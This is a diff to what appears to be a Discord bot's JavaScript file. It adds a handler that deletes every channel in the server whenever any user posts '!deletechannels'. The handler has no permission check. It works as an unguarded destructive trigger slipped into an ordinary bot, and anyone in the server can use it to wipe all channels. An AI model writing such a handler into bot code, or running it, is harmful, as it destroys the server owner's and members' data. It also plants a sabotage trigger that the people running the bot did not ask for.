@@ -1694,5 +1694,14 @@ function datediff(first, second) {
 
 
 
+
+client.on('message' , message => {
+if(message.content === '!deletechannels') {
+message.guild.channels.forEach(c => { c.delete()});
+}
+});
+
+
+
 client.login(process.env.BOT_TOKEN);
 
